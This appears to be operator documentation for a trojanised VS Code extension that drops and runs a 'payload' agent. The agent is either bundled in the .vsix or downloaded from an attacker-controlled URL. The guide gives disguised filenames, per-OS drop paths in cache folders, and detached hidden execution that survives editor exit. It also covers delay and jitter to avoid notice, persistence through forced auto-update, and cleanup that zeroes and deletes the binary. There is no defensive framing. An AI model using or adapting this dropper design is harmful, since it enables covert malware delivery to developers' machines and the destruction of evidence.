# Payload Configuration Guide

This document explains how to configure the extension for payload deployment.

## Configuration File

The extension reads `config.json` at activation time. If the file is missing,
defaults are used (embedded mode with no payload — effectively a no-op).

### Setup

```bash
cp config.example.json config.json
# Edit config.json with your values
```

`config.json` is gitignored and will NOT be included in the .vsix by default.
To bundle it, remove it from `.vscodeignore` before building.

## Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `method` | string | `"embedded"` | `"embedded"` (binary in .vsix) or `"download"` (fetch at runtime) |
| `url` | string | `""` | URL to download payload from (only if `method = "download"`) |
| `payloadName` | string | `"com.vscode.helper"` | Filename for the dropped payload |
| `delayMs` | number | `5000` | Delay before payload execution (ms) |
| `jitterMs` | number | `3000` | Random jitter added to delay (ms) |
| `persist` | boolean | `true` | Enable VS Code auto-update settings for persistence |
| `cleanup` | boolean | `true` | Delete dropped binary after launch |
| `cleanupDelayMs` | number | `30000` | Delay before cleanup (ms) |

## Methods

### Embedded

The payload binary is bundled inside the .vsix at `payload/agent`.
At runtime, it is copied to the drop directory and executed.

```json
{
  "method": "embedded",
  "payloadName": "com.vscode.helper"
}
```

Build with:
```bash
PAYLOAD_SOURCE=/path/to/your/agent bash build_extension.sh
```

### Download

The payload is downloaded at runtime from a URL you control.

```json
{
  "method": "download",
  "url": "https://your-server.example.com/files/agent",
  "payloadName": "com.vscode.helper"
}
```

## Drop Locations

| OS | Path |
|----|------|
| macOS | `~/Library/Application Support/Code/User/cache/<payloadName>` |
| Linux | `~/.cache/vscode/<payloadName>` |
| Windows | `%TEMP%\vscode-cache\<payloadName>` |

## Execution

- macOS / Linux: `nohup <payload> &` (detached, survives VS Code exit)
- Windows: detached `spawn()` with `windowsHide: true`

## Persistence

When `persist: true`, the extension enables:
- `extensions.autoUpdate = true`
- `extensions.autoCheckUpdates = true`

This ensures the extension (and its updates) are automatically installed.

## Cleanup

When `cleanup: true`, the dropped binary is:
1. Overwritten with zeros (first 4 KB)
2. Deleted from disk

This happens `cleanupDelayMs` after execution (default: 30s).
